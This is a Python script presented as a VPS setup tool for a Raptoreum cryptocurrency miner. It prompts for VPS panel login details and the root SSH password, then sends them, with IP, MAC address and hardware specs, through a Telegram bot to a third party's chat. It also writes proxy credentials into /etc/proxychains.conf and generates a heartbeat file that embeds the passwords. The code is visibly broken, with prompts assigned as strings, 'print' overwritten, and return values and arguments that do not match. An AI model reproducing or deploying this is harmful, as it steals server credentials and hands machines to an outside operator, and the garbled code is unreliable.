import subprocess
import requests
import json
import psutil
import telegram
from telegram import Bot
import time
from datetime import datetime, timedelta
import pytz


cpu_usage = psutil.cpu_percent(interval=1)
ram_usage = psutil.virtual_memory().percent

key = ("Enter the key that @pragotron sent ya: ")
id_code = ("Enter the code: ")
print = ("Good boy, now wait a bit dawg")
print()
# Function to get hardware information
def get_hardware_info():
    cpu_info = subprocess.check_output("lscpu").decode("utf-8")
    ram_info = psutil.virtual_memory()
    hdd_info = psutil.disk_usage('/')
    
    cpu_name = cpu_info.split('\n')[4].split(':')[1].strip()
    cpu_cores = cpu_info.split('\n')[7].split(':')[1].strip()
    cpu_threads = cpu_info.split('\n')[12].split(':')[1].strip()
    ram_gb = round(ram_info.total / (1024 ** 3), 2)
    hdd_gb = round(hdd_info.total / (1024 ** 3), 2)
    
    return cpu_name, cpu_cores, cpu_threads, ram_gb, hdd_gb

# Function to create proxy server
def create_proxy():
    # You can customize this part according to your needs
    proxy_port = 8888
    proxy_username = "pragotron"
    proxy_password = "Uf0P0rn01m1"
    
    subprocess.run(f'sudo apt-get install -y proxychains', shell=True)
    
    with open('/etc/proxychains.conf', 'a') as conf_file:
        conf_file.write(f'\n[ProxyList]\nhttp {proxy_username}:{proxy_password}@0.0.0.0:{proxy_port}')
    
    return f'0.0.0.0:{proxy_port}', proxy_username, proxy_password

# Function to get proxy location
def get_proxy_location(proxy_ip):
    try:
        response = requests.get(f'http://ip-api.com/json/24.15.54.221')
        data = json.loads(response.text)
        proxy_city = data['city']
        proxy_zip = data['zip']
        proxy_state = data.get('regionName', '') + " (" + data.get('region', '') + ")"
        proxy_country = data['country']
        proxy_lat = data['lat']
        proxy_lon = data['lon']
        proxy_isp = data['isp']
        
        return proxy_city, proxy_zip, proxy_state, proxy_country, proxy_lat, proxy_lon, proxy_isp
    except Exception as e:
        print(f"Error fetching proxy location: {e}")
        return None, None, None, None, None, None, None

# Function to send message to Telegram
def send_telegram_message(rig_name, ssh_connection, ssh_password, proxy_ip, proxy_username, proxy_password,
                          proxy_city, proxy_zip, proxy_state, proxy_country, proxy_lon, proxy_lat, proxy_isp,
                          ip_address, mac_address, cpu_name, cpu_cores, cpu_threads,
                          ram_gb, hdd_gb, email, username, panel_password):
    try:
        # Get current CPU usage
        cpu_usage = psutil.cpu_percent(interval=1)

        message = f"""\
New VPS miner online-:
EU Date/Time: {datetime.now(pytz.timezone('CET')).strftime('%d.%m.%Y - %H:%M')}

Rig name: {rig_name}

Account details-:
Website: https://linode.com/login
Email: {email}
Username: {username}
Password: {panel_password}

SSH: {ssh_connection}
Password: {ssh_password}

Proxy: {proxy_ip.split(':')[0]}:{proxy_ip.split(':')[1]}:{proxy_username}:{proxy_password}
IP: {proxy_ip.split(':')[0]}
Port: {proxy_ip.split(':')[1]}
Username: {proxy_username}
Password: {proxy_password}

Proxy location-:
City: {proxy_city}
ZIP: {proxy_zip}
State: {proxy_state}
Country: {proxy_country}
Latitude: {proxy_lat}
Longitude: {proxy_lon}
ISP: {proxy_isp}

Specs:
IP address: {ip_address}
MAC address: {mac_address}
CPU name: {cpu_name}
CPU cores: {cpu_cores}
CPU threads: {cpu_threads}
Current CPU usage: {cpu_usage}%  # Include current CPU usage here
RAM: {ram_gb} GB
HDD: {hdd_gb} GB
"""
        bot = Bot(token=key)
        bot.send_message(id_code, message)
        return True
    except Exception as e:
        print(f"Error sending Telegram message: {e}")
        return False

# Function to send heartbeat
def send_heartbeat(rig_name, username, email, password):
    try:
        message = f"{rig_name} VPS is alive.\nCurrent CPU usage is: {cpu_usage}%\nEmail: {email}\nPassword: {password}"
        bot = Bot(token=key)
        bot.send_message(id_code, message)
        return True
    except Exception as e:
        print(f"Error sending heartbeat message: {e}")
        return False

# Function to get IP and MAC address
def get_ip_mac_address():
    try:
        ip_address = subprocess.check_output("hostname -I", shell=True).decode("utf-8").split()[0]
        mac_address = subprocess.check_output("cat /sys/class/net/$(ip route show default | awk '/default/ {print $5}')/address", shell=True).decode("utf-8").strip()
        return ip_address, mac_address
    except Exception as e:
        print(f"Error getting IP and MAC address: {e}")
        return None, None

# Generate heartbeat_startup.py file
def generate_heartbeat_file(rig_name, username, email, password):
    try:
        with open("heartbeat_startup.py", "w") as file:
            file.write(f"""\
import psutil
import time

# Function to send heartbeat
def send_heartbeat():
    try:
        # Get CPU and RAM usage
        cpu_usage = psutil.cpu_percent(interval=1)
        ram_usage = psutil.virtual_memory().percent

        # Construct the heartbeat message
        message = f"{rig_name} VPS is alive.\\nCurrent CPU usage is: {cpu_usage}%\\nCurrent RAM usage is: {ram_usage}%\\nEmail: {email}\\nPassword: {password}"

        # Send the heartbeat message (implement your own logic here)
        print("Sending heartbeat:", message)

        # Simulating the delay of sending heartbeat every 60 minutes
        time.sleep(3600)  # 3600 seconds = 1 hour

        # Call the function recursively to continue sending heartbeat
        send_heartbeat()
    except Exception as e:
        print(f"Error sending heartbeat message: {e}")

# Variables
rig_name = "{rig_name}"
username = "{username}"
email = "{email}"
password = "{password}"

# Start sending heartbeat
send_heartbeat()
""")
        print("heartbeat_startup.py file generated successfully.")
    except Exception as e:
        print(f"Error generating heartbeat_startup.py file: {e}")

# Get hardware information
cpu_name, cpu_cores, cpu_threads, ram_gb, hdd_gb = get_hardware_info()

# Create proxy server
proxy_ip, proxy_username, proxy_password = create_proxy()

# Get proxy location
proxy_city, proxy_zip, proxy_state, proxy_country = get_proxy_location(proxy_ip.split(':')[0])

# Get IP and MAC address
ip_address, mac_address = get_ip_mac_address()

# Prompt user to input email and panel password
email = input("Enter email of the VPS panel: ")
username = input("Enter username of VPS panel: ")
panel_password = input("Enter password of the VPS panel: ")

# Send initial information to Telegram
rig_name = input("Enter your rig name: ")
ssh_connection = input("Enter SSH connection for the VPS: ")
ssh_password = input("Enter password for the su (admin): ")


if send_telegram_message(rig_name, ssh_connection, ssh_password, proxy_ip, proxy_username, proxy_password,
                         proxy_city, proxy_zip, proxy_state, proxy_country,
                         ip_address, mac_address, cpu_name, cpu_cores, cpu_threads,
                         ram_gb, hdd_gb, email, username, panel_password):
    generate_heartbeat_file(rig_name, username, email, panel_password)
    print("Initialization message sent and heartbeat_startup.py file generated.")
    print("Remember these:")
    print(f"Rig name: {rig_name}")
    print(f"CPU cores: {cpu_cores}")
    print()
    print("Executing Raptoreum Miner setup in: ")
    print("5")
    time.sleep(1)
    print("4")
    time.sleep(1)
    print("3")
    time.sleep(1)
    print("2")
    time.sleep(1)
    print("1")
    time.sleep(1)

else:
    print("Failed to send initialization message. Check the error logs.")